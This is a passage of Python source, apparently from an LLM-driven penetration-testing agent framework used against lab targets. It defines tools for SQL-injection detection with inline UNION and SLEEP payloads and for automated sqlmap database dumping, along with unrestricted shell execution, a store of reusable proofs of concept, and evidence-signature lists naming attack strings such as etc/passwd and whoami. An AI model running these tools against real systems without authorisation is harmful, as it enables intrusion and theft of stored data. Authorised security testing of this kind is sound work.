    # nmap 强制宿主机执行（部分 Kali 镜像容器内 EPERM 损坏；宿主执行行为一致更稳）
    # 默认快速（top 100 端口 + 版本），避免 -p 1-1000 全扫超时返回空
    cmd = f"nmap -sV -p {ports} {target}" if ports else f"nmap -F -sV {target}"
    result = await tool_bash(cmd, timeout=90)
    out = result.get("stdout", "") or result.get("result", "")
    return {"target": target, "result": out or f"(nmap no output, rc={result.get('returncode')})"}

_SQL_ERR_PATTERNS = [
    r"SQL syntax", r"unrecognized token", r"You have an error in your SQL",
    r"mysql_fetch", r"Warning:\s*mysql", r"PostgreSQL.*(ERROR|error)", r"SQLite.*error",
    r"\[Microsoft\]\[ODBC", r"\[SQL Server\]", r"ORA-\d{5}", r"SQLSTATE\[\w+\]",
    r"Incorrect syntax near", r"OLE DB", r"PG::.*Error", r"bind or column index out of range",
]

@tool("sqlmap", "Detect SQLi on host via deterministic HTTP probes (error/boolean/UNION/time-based). Use to confirm injection before sqlmap_exploit.",
      {"type": "object", "properties": {"url": {"type": "string"}, "params": {"type": "string", "default": ""},
        "method": {"type": "string", "default": "GET"}, "time_threshold": {"type": "number", "default": 2.5},
        "cookies": {"type": "string", "default": "", "description": "optional 'k1=v1;k2=v2' to carry an authenticated session"},
        "container": {"type": "string"}}},
      "inhouse")
async def tool_sqlmap(url: str, params: str = "", method: str = "GET",
                      time_threshold: float = 2.5, cookies: str = "", container: str = "") -> Dict[str, Any]:
    """确定性 SQLi 检测（原实现只有布尔 diff，现已扩展为四向量：error/boolean/UNION/time）。
    对每个参数做确定性测试，不依赖容器/外网/LLM。可用 cookies 携带认证会话。"""
    import urllib.parse, re as _re, time as _time
    _ck = {}
    if cookies:
        for item in cookies.split(";"):
            if "=" in item:
                k, v = item.strip().split("=", 1)
                _ck[k] = v
    parsed = urllib.parse.urlparse(url)
    param_names = []
    if parsed.query:
        param_names = [p.split("=")[0] for p in parsed.query.split("&") if "=" in p]
    if params:
        for p in params.split(","):
            if p.strip():
                param_names.append(p.strip())
    param_names = list(dict.fromkeys(p for p in param_names if p))
    if not param_names:
        return {"url": url, "error": "no parameters found or provided"}

    async def get(payload_url: str):
        try:
            async with httpx.AsyncClient(timeout=max(10, time_threshold * 2 + 2),
                                         follow_redirects=True) as c:
                t0 = _time.monotonic()
                r = await c.get(payload_url, cookies=_ck)
                return (_time.monotonic() - t0, r.status_code, r.text)
        except Exception:
            return (0.0, 0, "")

    def has_err(text: str) -> bool:
        return any(_re.search(p, text, _re.I) for p in _SQL_ERR_PATTERNS)

    per_param = []
    for param in param_names:
        if f"{param}=" not in url:
            continue
        vecs = []
        probe = lambda v: url.replace(f"{param}=", f"{param}={v}", 1)
        # 1. error-based：单引号 → SQL 错误特征
        _, _, body = await get(probe("'"))
        if has_err(body):
            vecs.append("error")
        # 2. boolean：OR true vs OR false 页面差异
        _, s1, b1 = await get(probe("true' OR '1'='1-- -"))
        _, s2, b2 = await get(probe("true' OR '1'='2-- -"))
        if s1 and s2 and (s1 != s2 or b1 != b2):
            vecs.append("boolean")
        # 3. UNION：递增 NULL 列数到"不报错 且 响应与基线不同"(排除常量/未进查询的参数, 如 Submit=Submit)
        _, s0, b0 = await get(url)
        for n in range(1, 7):
            _, s, body = await get(probe(f"' UNION SELECT {','.join(['NULL'] * n)}-- -"))
            if s and not has_err(body) and (s != s0 or body != b0):
                vecs.append(f"union({n})")
                break
        # 4. time-based：SLEEP 延迟
        dt, _, _ = await get(probe("' AND SLEEP(2)-- -"))
        if dt and dt >= max(1.8, time_threshold - 0.5):
            vecs.append("time-based")
        per_param.append({"param": param, "vectors": vecs,
                          "injectable": bool(vecs),
                          "evidence": " / ".join(vecs) if vecs else "no vector matched"})
    injectable = [p["param"] for p in per_param if p["injectable"]]
    return {"url": url, "method": method, "detector": "deterministic_four_vector",
            "results": per_param, "injectable_params": injectable}


def _parse_sqlmap_list(out: str, marker: str) -> List[str]:
    """解析 sqlmap 的 'available databases [N]:' 风格列表（marker 之后的 '[*] xxx' 行）。"""
    idx = out.find(marker)
    if idx < 0:
        return []
    seg = out[idx:]
    items: List[str] = []
    for line in seg.splitlines():
        s = line.strip()
        if s.startswith("[*]"):
            items.append(s[3:].strip())
        elif items and s.startswith("[") and not s.startswith("[*]"):
            break  # 进入下一个区块
    return items


def _parse_sqlmap_table(out: str, marker: str) -> List[List[str]]:
    """解析 sqlmap 表格：marker 之后第一个 +---+ 表格区块的所有数据行（去掉边框/分隔线）。
    sqlmap 表格有 3 条 +---+（起始/分隔/结束），中间的分隔线不能当作结束。"""
    idx = out.find(marker) if marker else 0
    if idx < 0:
        return []
    seg = out[idx:]
    m = re.search(r"\+[-+]+\+", seg)
    if not m:
        return []
    seg = seg[m.end():]
    rows: List[List[str]] = []
    lines = seg.splitlines()
    i = 0
    while i < len(lines):
        s = lines[i].strip()
        if not s:  # 空行：表格还没开始则跳过，进行中则结束
            if rows:
                break
            i += 1
            continue
        if s.startswith("|") and s.endswith("|"):
            rows.append([c.strip() for c in s.strip("|").split("|")])
            i += 1
        elif s.startswith("+") and set(s) <= set("+-"):
            # 边框：下一行还是表格行 → 是分隔线，继续；否则是真结束
            if i + 1 < len(lines) and lines[i + 1].strip().startswith("|"):
                i += 1
            else:
                break
        else:
            break
    return rows


@tool("sqlmap_exploit", "DETERMINISTIC SQLi EXPLOITATION — run the real sqlmap in the Kali sandbox to enumerate/DUMP DB rows (no manual payload). "
      "Call AFTER 'sqlmap' confirms injection. Returns {databases,db,tables,dump,evidence}; feed dump into submit_finding.",
      {"type": "object", "properties": {
          "url": {"type": "string", "description": "full URL carrying the injectable param value, e.g. http://host/vuln/?id=1&Submit=Submit"},
          "cookies": {"type": "string", "default": "", "description": "authenticated session as 'k1=v1;k2=v2' (REQUIRED when the target needs login)"},
          "param": {"type": "string", "default": "", "description": "the injectable parameter name (optional; narrows + speeds the scan)"},
          "level": {"type": "number", "default": 2},
          "risk": {"type": "number", "default": 1},
          "max_time": {"type": "number", "default": 150, "description": "sqlmap --max-time budget per stage, seconds"},
           "container": {"type": "string", "description": "Kali sandbox (injected automatically by the executor)"},
           "workdir": {"type": "string", "description": "working dir inside the sandbox (auto-injected)"}}},
      "inhouse")
async def tool_sqlmap_exploit(url: str, cookies: str = "", param: str = "",
                               level: float = 2, risk: float = 1,
                               max_time: float = 150, container: str = "", workdir: str = "") -> Dict[str, Any]:
    """确定性 SQLi 利用：在 Kali 沙箱里跑真实 sqlmap，--dbs → -D --tables → -T --dump，
    自动枚举并取数。取到的数据即 PoC 证据，无需 LLM 手写 payload（侦察/利用确定性拆分）。"""
    if not container:
        return {"error": "sqlmap_exploit needs the Kali sandbox container (injected automatically by the executor)"}
    cookie_s = re.sub(r"\s+", "", cookies or "")
    # sqlmap 1.9.12 无 --max-time；用容器内 timeout 命令控制每阶段时间上限
    cap = int(max_time) + 30
    base = [f"timeout {cap}s sqlmap -u {shlex.quote(url)} --batch "
            f"--level={int(level)} --risk={int(risk)} --threads=4"]
    if cookie_s:
        base.append(f"--cookie {shlex.quote(cookie_s)}")
    if param:
        base.append(f"-p {shlex.quote(param)}")
    if workdir:
        await tool_bash(f"docker exec {container} mkdir -p {shlex.quote(workdir)}", timeout=15)

    async def stage(*extra: str) -> str:
        w = f"-w {shlex.quote(workdir)} " if workdir else ""
        cmd = "docker exec " + w + container + " bash -c " + shlex.quote(" ".join(base + list(extra)))
        r = await tool_bash(cmd, timeout=int(max_time) + 90)
        return (r.get("stdout") or "") + (r.get("stderr") or "")

    out: Dict[str, Any] = {"url": url}
    # 1) 枚举数据库（sqlmap --dbs 输出是 'available databases [N]:\n[*] xxx' 列表）
    dbs_raw = await stage("--dbs")
    dbs = _parse_sqlmap_list(dbs_raw, "available databases")
    out["databases"] = dbs
    if not dbs:
        out["error"] = "no databases enumerated — not injectable, or wrong cookies/param"
        out["raw_tail"] = dbs_raw[-900:]
        return out
    _sys = {"information_schema", "mysql", "performance_schema"}
    biz = [d for d in dbs if d not in _sys]
    db = biz[0] if biz else dbs[0]
    out["db"] = db
    # 2) 枚举表（短选项用空格分隔：-D dvwa，不是 -D=dvwa）
    tabs_raw = await stage(f"-D {db}", "--tables")
    tables = [r[0] for r in _parse_sqlmap_table(tabs_raw, "")]
    out["tables"] = tables
    if not tables:
        out["raw_tail"] = tabs_raw[-900:]
        return out
    # 3) 取数（前 8 张表，控制耗时）
    top = tables[:8]
    dump_raw = await stage(f"-D {db}", f"-T {','.join(top)}", "--dump")
    dump_rows: List[Any] = []
    header: List[str] = []
    for chunk in re.split(r"Table:\s+", dump_raw):
        if "entries" not in chunk:
            continue
        rows = _parse_sqlmap_table(chunk, "entries")
        if len(rows) > 1:
            header = rows[0]
            dump_rows.extend(dict(zip(header, r)) if len(r) == len(header) else r for r in rows[1:])
        elif rows:
            dump_rows.append(rows[0])
    out["dump"] = dump_rows
    out["dump_count"] = len(dump_rows)
    out["raw_dump"] = dump_raw[-3000:]
    out["evidence"] = (f"REAL sqlmap (Kali) enumerated db '{db}' "
                       f"({len(dbs)} dbs, tables={top}) and DUMPED {len(dump_rows)} rows — "
                       f"deterministic extraction, no manual payload.")
    return out

# ---------------------------------------------------------------------------
# 8. PoC 验证 + 证据捕获
# ---------------------------------------------------------------------------

@tool("poc_verify", "Execute a PoC payload and capture evidence with baseline comparison.",
      {"type": "object", "properties": {"url": {"type": "string"}, "payload": {"type": "string"},
        "method": {"type": "string", "default": "GET"}, "baseline": {"type": "string", "default": ""}}},
      "inhouse")
async def tool_poc_verify(url: str, payload: str, method: str = "GET",
                           baseline: str = "") -> Dict[str, Any]:
    base_resp = {}
    if baseline:
        base_resp = await tool_http_request(baseline, method)
    poC_resp = await tool_http_request(url, method, params={"__poc__": payload}) if method == "GET" else await tool_http_request(url, method, body=payload)
    return {"url": url, "payload": payload,
            "baseline": base_resp,
            "poc_response": poC_resp,
            "diff": {"baseline_status": base_resp.get("status"), "poc_status": poC_resp.get("status"),
                     "baseline_len": len(base_resp.get("text", "")), "poc_len": len(poC_resp.get("text", ""))},
            "verified": poC_resp.get("status", 0) != base_resp.get("status", 0) or poC_resp.get("text", "") != base_resp.get("text", "")}

# ---------------------------------------------------------------------------
# 9. 报告 + 生命周期
# ---------------------------------------------------------------------------

def _board_post(task_id: str, target: str, f: Dict[str, Any], found_by: str = "inhouse", status: str = "found") -> Optional[int]:
    return board_post(task_id, target, f, found_by, status)

def validate_finding(f: Dict[str, Any]) -> Optional[str]:
    for field in ["title", "poc", "evidence"]:
        if not str(f.get(field, "")).strip():
            return f"missing: {field}"
    return None


# ---- 证据真实性签名门禁（防误报：evidence/poc 必须命中该漏洞类的特征签名）----
# 见 t1 误报实锤：brute 模块被错报成 SQLi（evidence 只有"疑似"无真注入特征）。
_EVIDENCE_SIG = {
    "sql injection": ["sqlmap", "union select", "and 1=1", "and 1=2", "' or'", "' or '",
                      "syntax error", "unknown column", "you have an error", "mysql", "sqlite",
                      "exists in the database", "dumped", "substr(", "select user", "quote"],
    "sqli": ["sqlmap", "union select", "and 1=1", "and 1=2", "syntax error", "unknown column",
             "you have an error", "mysql", "sqlite", "exists in the database", "dumped", "substr("],
    "xss": ["<script", "</script", "alert(", "onerror", "onload", "javascript:", "<svg",
            "prompt(", "onfocus", "onmouse", "onclick"],
    "file upload": ["upload", ".php", "shell", "move_uploaded", "filename", "rce", "executed"],
    "command injection": [";id", "; uname", "exec", "ping", "system(", "command", ";ls", "whoami", "ifconfig"],
    "auth bypass": ["or '1'='1", "logged in", "welcome", "bypass", "admin'", "success"],
    "csrf": ["token", "changed", "no token", "missing", "state", "302"],
    "session": ["session", "phisessid", "cookie", "not regenerated", "unchanged", "fixation"],
    "idor": ["user", "id=", "other user", "unauthorized", "object", "/users/", "200"],
    "brute": ["lockout", "rate limit", "no rate", "failed", "password", "account"],
    "default": ["default", "password", "login", "admin/password", "welcome"],
    "open redirect": ["location", "302", "redirect", "30x"],
    "info disclosure": ["backup", ".git", "secret", "source", "debug", "error"],
    "ssrf": ["metadata", "localhost", "internal", "fetch", "169.254", "server-side", "cloud"],
    "lfi": ["../", "etc/passwd", "file=", "include", "read", "root:"],
    "rce": ["system(", "exec", "id", "whoami", "result", ";"],
    "weak id": ["predictable", "session", "increment", "sequential", "cookie"],
}


def _evidence_plausible(f: Dict[str, Any]) -> Optional[str]:
    vc = str(f.get("vuln_class", "") or "").lower()
    ev = (str(f.get("evidence", "") or "") + " " + str(f.get("poc", "") or "")).lower()
    if not ev.strip():
        return "evidence empty"
    for cls, sigs in _EVIDENCE_SIG.items():
        if cls in vc:
            if any(s in ev for s in sigs):
                return None  # plausible
            return (f"evidence 无 '{cls}' 特征签名（如 '{sigs[0]}'/'{sigs[1]}'）—— 疑似误报，"
                    f"请提供该漏洞类特有的真实响应/数据作为证据")
    return None  # 未匹配的漏洞类不拦（放行）

# ---- KB 回吐（经验回流闭环·回吐侧）----
# target 归一化（权威定义在此，orchestrator_v2/executor 都从 tools import，避免循环依赖）
# IP → 稳定 target_id 映射走 .env 的 PIMETA_TARGET_ID_MAP（"ip=id,ip=id"），
# 不硬编码进仓库（靶场 IP 属本机环境，公开前已剥离）；任务显式 target_id 优先于此表。
def _target_id_map() -> dict[str, str]:
    out: dict[str, str] = {}
    for part in env("PIMETA_TARGET_ID_MAP").split(","):
        if "=" not in part:
            continue
        k, _, v = part.partition("=")
        k, v = k.strip(), v.strip()
        if k and v:
            out[k] = v
    return out


def resolve_target_id(target: str, explicit: str = "") -> str:
    """稳定 target_id：显式 > IP映射表(.env) > host。"""
    if explicit:
        return explicit.strip().lower()
    m = re.search(r"://([^/:]+)", target or "")
    host = m.group(1) if m else (target or "").strip()
    return _target_id_map().get(host, host)


def _ingest_finding_to_kb(title: str, poc: str, evidence: str, asset: str,
                          vuln_class: str, target_id: str) -> Optional[str]:
    """把带 PoC 的 verified finding 回吐 KB（type=poc, scope=all 去标识化）。

    KB 纯通用：回吐的 poc 去标识化（去 IP/URL→<target>）+ scope=all，保持跨靶场可迁移；
    target_id 只作来源标记（tags + content 尾注），不进 scope。
    护栏：PoC 只存 KB 库（不进 LLM context）——热启动 brief 读靶场档案，不读 poc content。
    质量门禁：poc+evidence 非空（validate_finding 已保证）。
    去重：scope=all 同 vuln_class 同 asset(去标识化) 已有 poc → 跳过。
    """
    if not target_id or not poc or not evidence:
        return None
    def _anon(s: str) -> str:
        return re.sub(r"https?://[0-9A-Za-z.:/_?=&\-]+", "<target>", s or "")
    poc_a, evidence_a, asset_a = _anon(poc), _anon(evidence), _anon(asset)
    try:
        from redkb.schemas import KnowledgeEntry
        from redkb import store
    except Exception:
        return None
    try:
        existing = [e for e in store.list_knowledge()
                    if e.scope == "all" and e.type == "poc" and e.status != "disabled"
                    and (vuln_class.lower() in (e.title or "").lower())
                    and (not asset_a or asset_a in (e.title or ""))]
        if existing:
            return existing[0].id
        entry = KnowledgeEntry(
            type="poc",
            title=f"{vuln_class} @ {asset_a or (title or '')[:50]}",
            content=f"PoC: {poc_a[:2000]}\n\nEvidence: {evidence_a[:1200]}\n\n(source target: {target_id})",
            tags=[vuln_class.lower(), target_id, "lab"],
            scope="all",
            status="authoritative", verified=True, proof_method="replay",
            source_type="agent", case_evidence=[evidence_a[:300]], confidence=0.85,
        )
        return store.ingest(entry)
    except Exception:
        return None


@tool("submit_finding", "Submit a verified finding. Gates: poc/evidence non-empty, dedup, CVSS.",
       {"type": "object", "properties": {"title": {"type": "string"}, "poc": {"type": "string"},
          "evidence": {"type": "string"}, "asset": {"type": "string"}, "severity": {"type": "string"},
          "vuln_class": {"type": "string"}, "confidence": {"type": "string"}, "counterevidence": {"type": "string"},
          "task_id": {"type": "string"}, "target": {"type": "string"}}},
       "strix")
async def tool_submit_finding(title: str, poc: str, evidence: str, asset: str = "",
                              severity: str = "medium", vuln_class: str = "other",
                              confidence: str = "medium", counterevidence: str = "",
                              task_id: str = "", target_id: str = "", target: str = "") -> Dict[str, Any]:
    if not task_id:
        return {"accepted": False, "reason": "missing task_id"}
    f = {"title": title, "poc": poc, "evidence": evidence, "asset": asset,
         "severity": severity, "vuln_class": vuln_class, "confidence": confidence,
         "counterevidence": counterevidence}
    err = validate_finding(f)
    if err:
        return {"accepted": False, "reason": err}
    sig_reason = _evidence_plausible(f)
    status = "found" if not sig_reason else "suspect"
    writing_target = target or asset or ""
    fid = _board_post(task_id, writing_target, f, "inhouse", status)
    kb_id = None
    if fid is not None and not sig_reason:
        try:
            kb_id = _ingest_finding_to_kb(title, poc, evidence, asset, vuln_class,
                                          target_id or resolve_target_id(writing_target))
        except Exception:
            pass
        try:
            c = _conn()
            c.execute("INSERT INTO coverage(task_id,surface,risk_area,outcome,evidence,created_at) VALUES(?,?,?,?,?,?)",
                      (task_id, asset or title, vuln_class, "reported",
                       (poc or evidence)[:240], time.strftime("%Y-%m-%dT%H:%M:%S")))
            c.commit(); c.close()
        except Exception:
            pass
    return {"accepted": fid is not None, "id": fid, "kb_id": kb_id,
            "reason": sig_reason or ("duplicate" if fid is None else None),
            "status": status}


@tool("done", "Signal completion of the agent's task.",
      {"type": "object", "properties": {"summary": {"type": "string"}}},
      "pentagi")
async def tool_done(summary: str = "") -> Dict[str, Any]:
    return {"status": "done", "summary": summary}

@tool("advice", "Request mentor advice when stuck.",
      {"type": "object", "properties": {"question": {"type": "string"}}},
      "pentagi")
async def tool_advice(question: str) -> Dict[str, Any]:
    return {"advice": f"Consider: {question}. Try a different approach or declare ruled_out."}

@tool("subtask_list", "Submit a dynamic replanning list.",
      {"type": "object", "properties": {"items": {"type": "array", "items": {"type": "string"}}}},
      "pentagi")
async def tool_subtask_list(items: List[str]) -> Dict[str, Any]:
    return {"ok": True, "items": items}

@tool("subtask_patch", "Patch the current subtask plan.",
      {"type": "object", "properties": {"action": {"type": "string", "enum": ["add", "modify", "remove"]},
        "index": {"type": "integer"}, "content": {"type": "string"}}},
      "pentagi")
async def tool_subtask_patch(action: str, index: int = 0, content: str = "") -> Dict[str, Any]:
    return {"ok": True, "action": action, "index": index}

@tool("terminal", "Execute a command in a Docker sandbox container.",
      {"type": "object", "properties": {"cmd": {"type": "string"}, "container": {"type": "string"},
                                        "workdir": {"type": "string", "description": "working dir inside the container (auto-injected per agent; use /work/shared for reusable artifacts)"}}},
      "pentagi")
async def tool_terminal(cmd: str, container: Optional[str] = None, workdir: str = "") -> Dict[str, Any]:
    if container:
        # 共享沙箱下每个 agent 独立工作目录：先确保目录存在，再 -w 切入（隔离文件状态）
        if workdir:
            await tool_bash(f"docker exec {container} mkdir -p {shlex.quote(workdir)}", timeout=15)
            return await tool_bash(f"docker exec -w {shlex.quote(workdir)} {container} bash -c {shlex.quote(cmd)}")
        # bash -c 走 shell（支持 cd && ... 等）；shlex 安全引用
        return await tool_bash(f"docker exec {container} bash -c {shlex.quote(cmd)}")
    return await tool_bash(cmd)

@tool("file", "Read/write a file.",
      {"type": "object", "properties": {"path": {"type": "string"}, "action": {"type": "string", "enum": ["read", "write"]}, "content": {"type": "string"}}},
      "pentagi")
async def tool_file(path: str, action: str = "read", content: str = "") -> Dict[str, Any]:
    if action == "write":
        return await tool_write(path, content)
    return await tool_read(path)

@tool("report_result", "Submit the final report summary.",
      {"type": "object", "properties": {"summary": {"type": "string"}, "findings": {"type": "array"}}},
      "pentagi")
async def tool_report_result(summary: str, findings: List[Dict[str, Any]] = None) -> Dict[str, Any]:
    return {"status": "reported", "summary": summary, "findings_count": len(findings or [])}

@tool("ask", "Ask the user a question.",
      {"type": "object", "properties": {"question": {"type": "string"}}},
      "pentagi")
async def tool_ask(question: str) -> Dict[str, Any]:
    return {"question": question, "status": "waiting_for_user"}

@tool("memory", "Get or set long-term memory in pimeta.db.",
      {"type": "object", "properties": {"action": {"type": "string", "enum": ["get", "set"]},
        "key": {"type": "string"}, "value": {"type": "string"}}},
      "inhouse")
async def tool_memory(action: str, key: str = "", value: str = "") -> Dict[str, Any]:
    conn = _conn()
    try:
        if action == "set":
            conn.execute("INSERT OR REPLACE INTO agent_memory(key,value,updated_at) VALUES(?,?,?)",
                         (key, value, time.strftime("%Y-%m-%dT%H:%M:%S")))
            conn.commit()
            return {"ok": True}
        else:
            r = conn.execute("SELECT value FROM agent_memory WHERE key=?", (key,)).fetchone()
            return {"value": r[0] if r else None}
    finally:
        conn.close()

# ---------------------------------------------------------------------------
# 缺失工具补齐
# ---------------------------------------------------------------------------

@tool("nikto", "Web server vulnerability scanner (nikto).",
      {"type": "object", "properties": {"url": {"type": "string"}, "container": {"type": "string"},
                                        "workdir": {"type": "string"}}},
      "pentagi")
async def tool_nikto(url: str, container: str = "", workdir: str = "") -> Dict[str, Any]:
    cmd = f"nikto -h {url}"
    result = await tool_terminal(cmd, container=container, workdir=workdir) if container else await tool_bash(cmd)
    return {"url": url, "result": result.get("stdout", "")[:5000]}

@tool("store_answer", "Store a verified answer/knowledge into RED-KB.",
      {"type": "object", "properties": {"question": {"type": "string"}, "answer": {"type": "string"}, "tags": {"type": "array", "items": {"type": "string"}}}},
      "pentagi")
async def tool_store_answer(question: str, answer: str, tags: Optional[List[str]] = None) -> Dict[str, Any]:
    return await _store_kb("answer", question, answer, tags)

@tool("store_code", "Store a verified PoC/technique into RED-KB code store.",
      {"type": "object", "properties": {"code": {"type": "string"}, "description": {"type": "string"}, "tags": {"type": "array", "items": {"type": "string"}}}},
      "pentagi")
async def tool_store_code(code: str, description: str, tags: Optional[List[str]] = None) -> Dict[str, Any]:
    return await _store_kb("code", description, code, tags)

@tool("store_guide", "Store a generic playbook/technique guide into RED-KB.",
      {"type": "object", "properties": {"title": {"type": "string"}, "content": {"type": "string"}, "tags": {"type": "array", "items": {"type": "string"}}}},
      "pentagi")
async def tool_store_guide(title: str, content: str, tags: Optional[List[str]] = None) -> Dict[str, Any]:
    return await _store_kb("guide", title, content, tags)

async def _store_kb(kind: str, title: str, content: str, tags: Optional[List[str]] = None) -> Dict[str, Any]:
    try:
        async with httpx.AsyncClient(timeout=30) as c:
            r = await c.post(f"{REDKB_URL}/kb/ingest", json={
                "content": content,
                "tags": tags or [],
                "title": title,
                "type": kind,
            }, timeout=30)
            return {"ok": r.status_code == 200, "status": r.status_code}
    except Exception as e:
        return {"ok": False, "error": str(e)}

@tool("search_guide", "Search pentest technique guides in RED-KB.",
      {"type": "object", "properties": {"query": {"type": "string"}, "limit": {"type": "integer"}}},
      "pentagi")
async def tool_search_guide(query: str, limit: int = 3) -> Dict[str, Any]:
    return await query_kb_redkb(query, tags=["guide"], limit=limit)

# ---------------------------------------------------------------------------
# 缺失工具补齐
# ---------------------------------------------------------------------------

@tool("exec_command", "Execute a shell command and return output.",
      {"type": "object", "properties": {"command": {"type": "string"}, "container": {"type": "string"},
                                        "workdir": {"type": "string"}}},
      "strix")
async def tool_exec_command(command: str, container: str = "", workdir: str = "") -> Dict[str, Any]:
    result = await tool_terminal(command, container=container, workdir=workdir) if container else await tool_bash(command)
    return {"output": result.get("stdout", ""), "exit_code": result.get("returncode")}

@tool("python", "Execute a Python code snippet.",
      {"type": "object", "properties": {"code": {"type": "string"}, "container": {"type": "string"},
                                        "workdir": {"type": "string"}}},
      "strix")
async def tool_python(code: str, container: str = "", workdir: str = "") -> Dict[str, Any]:
    cmd = f"python3 -c {json.dumps(code)}"
    result = await tool_terminal(cmd, container=container, workdir=workdir) if container else await tool_bash(cmd)
    return {"output": result.get("stdout", ""), "stderr": result.get("stderr", "")}

@tool("list_files", "List files in a scoped working directory.",
      {"type": "object", "properties": {"path": {"type": "string"}}},
      "strix")
async def tool_list_files(path: str = ".") -> Dict[str, Any]:
    return await tool_ls(path)

@tool("mark_todo_pending", "Mark a todo as pending again.",
      {"type": "object", "properties": {"index": {"type": "integer"}}},
      "strix")
async def tool_mark_todo_pending(index: int) -> Dict[str, Any]:
    conn = _conn()
    try:
        conn.execute("UPDATE todos SET status='pending' WHERE index_num=?", (index,))
        conn.commit()
    finally:
        conn.close()
    return {"ok": True, "index": index}

@tool("delete_todo", "Delete a todo by index.",
      {"type": "object", "properties": {"index": {"type": "integer"}}},
      "strix")
async def tool_delete_todo(index: int) -> Dict[str, Any]:
    conn = _conn()
    try:
        conn.execute("DELETE FROM todos WHERE index_num=?", (index,))
        conn.commit()
    finally:
        conn.close()
    return {"ok": True, "index": index}

@tool("get_note", "Get a single note by id.",
      {"type": "object", "properties": {"id": {"type": "integer"}}},
      "strix")
async def tool_get_note(id: int) -> Dict[str, Any]:
    conn = _conn()
    try:
        r = conn.execute("SELECT id,title,content FROM notes WHERE id=?", (id,)).fetchone()
    finally:
        conn.close()
    return dict(r) if r else {"error": "not found"}

@tool("delete_note", "Delete a note by id.",
      {"type": "object", "properties": {"id": {"type": "integer"}}},
      "strix")
async def tool_delete_note(id: int) -> Dict[str, Any]:
    conn = _conn()
    try:
        conn.execute("DELETE FROM notes WHERE id=?", (id,))
        conn.commit()
    finally:
        conn.close()
    return {"ok": True, "id": id}

@tool("create_vulnerability_report", "Create the final vulnerability report artifact.",
      {"type": "object", "properties": {"report": {"type": "string"}, "task_id": {"type": "string"}}},
      "strix")
async def tool_create_vulnerability_report(report: str, task_id: str = "") -> Dict[str, Any]:
    conn = _conn()
    try:
        conn.execute("INSERT OR REPLACE INTO reports(task_id, report, created_at) VALUES(?,?,?)",
                     (task_id or "inhouse", report, time.strftime("%Y-%m-%dT%H:%M:%S")))
        conn.commit()
        return {"ok": True, "task_id": task_id or "inhouse"}
    except Exception as e:
        return {"error": str(e)}
    finally:
        conn.close()

@tool("list_reports", "List all saved reports.",
      {"type": "object", "properties": {}},
      "strix")
async def tool_list_reports() -> Dict[str, Any]:
    conn = _conn()
    try:
        rows = conn.execute("SELECT id,task_id,created_at FROM reports").fetchall()
    finally:
        conn.close()
    return {"reports": [dict(r) for r in rows]}

@tool("finish_scan", "Signal that the scan is complete and produce final summary.",
      {"type": "object", "properties": {"summary": {"type": "string"}, "findings_count": {"type": "integer"}}},
      "strix")
async def tool_finish_scan(summary: str = "", findings_count: int = 0) -> Dict[str, Any]:
    return {"status": "scan_complete", "summary": summary, "findings_count": findings_count}

@tool("amend_threat_model", "Record a threat-model note for scoping.",
      {"type": "object", "properties": {"note": {"type": "string"}}},
      "strix")
async def tool_amend_threat_model(note: str) -> Dict[str, Any]:
    conn = _conn()
    try:
        conn.execute("INSERT INTO notes(title, content, created_at) VALUES(?,?,?)",
                     ("threat_model", note, time.strftime("%Y-%m-%dT%H:%M:%S")))
        conn.commit()
    finally:
        conn.close()
    return {"ok": True, "note": note}

@tool("apply_patch", "Apply a code patch (unified diff).",
      {"type": "object", "properties": {"patch": {"type": "string"}}},
      "strix")
async def tool_apply_patch(patch: str) -> Dict[str, Any]:
    result = await tool_bash(f"patch -p1 <<'PATCHEOF'\n{patch}\nPATCHEOF")
    return {"output": result.get("stdout", ""), "exit_code": result.get("returncode")}

@tool("list_sitemap", "List discovered sitemap URLs from previous recon.",
      {"type": "object", "properties": {"url": {"type": "string"}}},
      "strix")
async def tool_list_sitemap(url: str = "") -> Dict[str, Any]:
    return {"url": url, "urls": [], "note": "Sitemap not pre-populated; crawl via http_request/web_get_contents"}

@tool("ask_user", "Ask the user a clarifying question.",
      {"type": "object", "properties": {"question": {"type": "string"}}},
      "pentagi")
async def tool_ask_user(question: str) -> Dict[str, Any]:
    return {"question": question, "status": "waiting_for_user"}


# ---------------------------------------------------------------------------
# 全量工具用法库 + tool_help（让模型按需查询"某个工具怎么用"，覆盖全部 56 个工具）
# ---------------------------------------------------------------------------
TOOL_HELP: Dict[str, str] = {
    # ---- 渗透核心（另有 CORE_TOOL_MANUAL 注入 system prompt）----
    "http_request": "Fetch/send to the target (GET/POST/PUT/DELETE). params=dict, headers=dict, body=str. Returns {status,headers,text<=8000,history}. text TRUNCATED at 8000.",
    "sqlmap": "4-vector SQLi DETECTOR (error/boolean/union/time). Pass full URL with a param value; params='id' optional; REQUIRED cookies='k=v;k=v' on authenticated targets. Returns per-param injectable/vectors. Then build the PoC + submit_finding.",
    "kb_query": "Query RED-KB knowledge (PROVEN PoCs/techniques). query=feature/finding phrase (not target name), tags optional, limit. ALWAYS use before reinventing.",
    "submit_finding": "Submit a CONFIRMED vuln. title, poc(concrete request/payload), evidence(response/data), asset, severity, vuln_class, confidence. Record the MOMENT you have a working proof.",
    "record_coverage": "Record an assessed surface honestly. outcome=reported/no_issue_found/ruled_out(needs evidence)/not_applicable/needs_follow_up. Unrecorded=unexamined, not clean.",
    "poc_verify": "Verify payload vs baseline (diff-confirm). url, payload, method. Returns {baseline,poc_response,diff,verified}.",
    "browser": "Playwright headless browser. actions: navigate/screenshot/click/fill/eval(+selector,value). Use for JS-rendered pages, XSS execution proof, auth flows. Each call = new chromium (slow).",
    # ---- 文件/命令（宿主）----
    "read": "Read a local file. path, limit(max chars). Returns {content}.",
    "write": "Write a local file (creates dirs). path, content.",
    "edit": "Replace exact string in a file. path, old_str, new_str.",
    "bash": "Run a host shell command. cmd, timeout. Returns {returncode,stdout,stderr}. For host-only ops; use terminal for sandbox/Kali.",
    "grep": "Grep host files. pattern, path. Returns first 50 matches.",
    "find": "Find host files by name. pattern, path.",
    "ls": "List host directory. path.",
    "file": "Read/write a file (action=read/write). path, content.",
    "apply_patch": "Apply a patch on host. Use to fix a vuln in source (white-box).",
    # ---- pimeta.db 记录/任务 ----
    "memory": "Get/set long-term memory (action=get/set, key, value) in pimeta.db.",
    "search_in_memory": "Search agent_memory by key LIKE. query.",
    "search_code": "Search code files (alias of grep). query.",
    "list_files": "List files (alias of ls). path.",
    "todo_write": "Create/update todos. items=[{content,status}]. status=in_progress/completed/pending.",
    "list_todos": "List todos.",
    "mark_todo_done": "Mark todo(index) completed.",
    "mark_todo_pending": "Mark todo(index) pending.",
